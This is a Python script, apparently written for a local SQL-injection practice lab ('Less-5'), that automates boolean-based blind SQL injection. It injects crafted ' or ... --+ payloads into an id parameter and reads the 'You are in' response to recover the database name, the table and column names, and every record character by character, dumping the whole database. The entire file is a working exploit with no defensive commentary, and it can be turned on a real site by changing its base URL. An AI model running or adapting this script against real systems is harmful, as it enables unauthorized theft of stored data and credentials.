#!/usr/bin/python3

# Blind SQL Data Extraction

import requests
import re
import string

base_url='http://localhost/Less-5/?id='
truth_flag='You are in'

def cur_db_name():
	len=0
	while True:
		len+=1
		url=base_url + f"' or length((select database()))={len} --+"	
		resp=requests.get(url)
		if re.search(truth_flag,resp.text):
	 		print("The current database's name length is ",len)
	 		break

	db_name=""
	for idx in range(1,len+1):
		for chr in string.printable:
			url=base_url + f"' or binary substr((select database()),{idx},1)='{chr}' --+"
			resp=requests.get(url)
			if re.search(truth_flag,resp.text):
				db_name+=chr

	print("The current database name is "+db_name)
	return db_name


# Number of tables in current database

def how_many_tables(db_name):
	num_tables=0
	while True:
		num_tables+=1
		url=base_url + f"' or (select count(table_name) from information_schema.tables where table_schema='{db_name}')={num_tables} --+"	
		resp=requests.get(url)
		if re.search(truth_flag,resp.text):
	 		print(f"The number of tables in database {db_name} is ",num_tables)
	 		break
	return num_tables 		


def list_tables(db_name):
	num_tables=how_many_tables(db_name)
	tables=[]
	for i in range(num_tables):
		# First calculate the length of this table's name
		table_len=0
		while True:
			table_len+=1
			url=base_url + f"' or length((select table_name from information_schema.tables where table_schema='{db_name}' LIMIT {i},1))={table_len} --+"	
			resp=requests.get(url)
			if re.search(truth_flag,resp.text):
		 		print("The length of table #", i+1 ," is",table_len)
		 		break


		table_name=""
		for idx in range(1,table_len+1):
			for chr in string.printable: 	
				url=base_url + f"' or binary substring((select table_name from information_schema.tables where table_schema='{db_name}' LIMIT {i},1),{idx},1)='{chr}' --+"
				resp=requests.get(url)
				if re.search(truth_flag,resp.text):
					table_name+=chr
					break
					
		print('Table',i+1,"is ",table_name)
		tables.append(table_name)
		print('..')
		print('..')
	return tables	


def how_many_records(table_name):
	num_records=-1
	while True:
		num_records+=1
		url=base_url + f"' or (select count(*) from {table_name})={num_records} --+"	
		resp=requests.get(url)
		if re.search(truth_flag,resp.text):
	 		print(f"\tThe number of records in {table_name} is ",num_records)
	 		break
	return num_records



def how_many_columns(table_name):
	num_columns=0
	while True:
		num_columns+=1
		url=base_url + f"' or (select count(*) from information_schema.columns where table_name='{table_name}')={num_columns} --+"	
		resp=requests.get(url)
		if re.search(truth_flag,resp.text):
	 		print(f"\tThe number of columns in {table_name} is ",num_columns)
	 		break
	return num_columns 		


# List each column name

def list_columns(num_columns,table_name,db_name):
	columns=[]
	for i in range(num_columns):
		# First calculate the length of this column's name
		column_len=0
		while True:
			column_len+=1
			url=base_url + f"' or length((select column_name from information_schema.columns where table_name='{table_name}' LIMIT {i},1))={column_len} --+"	
			resp=requests.get(url)
			if re.search(truth_flag,resp.text):
		 		print("\t\tThe length of column #", i+1 ," is",column_len)
		 		break


		column_name=""
		for idx in range(1,column_len+1):
			for chr in string.printable: 	
				url=base_url + f"' or binary substring((select column_name from information_schema.columns where table_name='{table_name}' LIMIT {i},1),{idx},1)='{chr}' --+"
				resp=requests.get(url)
				if re.search(truth_flag,resp.text):
					column_name+=chr
					break
					
		print('\t\tColumn',i+1,"is ",column_name)
		columns.append(column_name)
		print()
	return columns	



def dump_column(num_records,col_name,table_name):
	for i in range(num_records):
		# First calculate the length of this column's name
		len=0
		while True:
			len+=1
			url=base_url + f"' or length((select {col_name} from {table_name} LIMIT {i},1))={len} --+"	
			resp=requests.get(url)
			if re.search(truth_flag,resp.text):
		 		print(f"\t\tThe length of {col_name} #", i+1 ," is",len)
		 		break


		value=""
		for idx in range(1,len+1):
			for chr in string.printable: 	
				url=base_url + f"' or binary substring((select {col_name} from {table_name} LIMIT {i},1),{idx},1)='{chr}' --+"
				resp=requests.get(url)
				if re.search(truth_flag,resp.text):
					value+=chr
					break
					
		print("\t\t",col_name,i+1,"is ",value)
		print('..')
		print('..')


def dump_the_fucking_database(db_name):
	print('\n\n#####################################')
	print(f"Database {db_name}")
	print('#####################################\n\n')
	tables=list_tables(db_name)
	print(f"\nOkayyy ! Sooo === ",tables," , ===== right!\n")
	for table in tables:
		print(f'-----------This is table "{table}"--------------\n')
		num_records=how_many_records(table)
		num_columns=how_many_columns(table)
		print('\n\t......Columns enumeration man!!\n')
		columns=list_columns(num_columns,table,db_name)
		print(f'\t\tAll columns in {table} ',end='---> ')
		print(columns)
		for column in columns:
			print(f"\n\t\t== Column {column} ==")
			dump_column(num_records,column,table)
		print()
		print("-------------------------------------------------------")
		print()	


db_name=cur_db_name()
dump_the_fucking_database(db_name)


